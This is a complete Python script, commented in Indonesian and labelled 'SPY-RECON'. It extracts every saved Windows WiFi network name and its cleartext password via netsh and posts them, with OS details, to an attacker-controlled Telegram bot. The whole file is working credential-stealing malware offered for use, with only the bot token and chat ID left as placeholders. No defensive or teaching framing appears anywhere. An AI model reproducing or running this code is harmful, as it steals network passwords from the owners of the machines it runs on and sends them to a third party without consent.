import subprocess
import re
import requests
import json
import platform
import sys

# --- [ KONFIGURASI SPY-E ] ---
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
# -----------------------------

def get_wifi_credentials():
    """Ekstraksi SSID dan Password dari Windows WLAN Service."""
    payload = []
    if platform.system() != "Windows":
        return "Error: Skrip ini khusus untuk target Windows (CMD)."

    try:
        # Ambil daftar profil
        raw_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore")
        ssids = re.findall(r"All User Profile\s+:\s(.*)\r", raw_profiles)
        
        for ssid in ssids:
            name = ssid.strip()
            try:
                # Ekstraksi password cleartext
                raw_details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="ignore")
                key_match = re.search(r"Key Content\s+:\s(.*)\r", raw_details)
                
                password = key_match.group(1).strip() if key_match else "None/Open"
                payload.append({"ssid": name, "password": password})
            except:
                continue
                
        return payload
    except Exception as e:
        return f"Error: {str(e)}"

def send_to_telegram(data):
    """Kirim hasil ke Telegram Bot dengan format profesional."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    
    info = {
        "os_target": platform.system(),
        "os_release": platform.release(),
        "total_found": len(data) if isinstance(data, list) else 0,
        "networks": data
    }
    
    formatted_json = json.dumps(info, indent=2)
    message = f"<b>📡 SPY-RECON: WiFi Extracted</b>\n<code>{formatted_json}</code>"
    
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        requests.post(url, json=payload)
        print("[+] Data berhasil dikirim ke Telegram.")
    except Exception as e:
        print(f"[-] Gagal transmisi: {e}")

if __name__ == "__main__":
    print("[*] Memulai ekstraksi...")
    results = get_wifi_credentials()
    if results:
        send_to_telegram(results)
    else:
        print("[-] Tidak ada data ditemukan.")
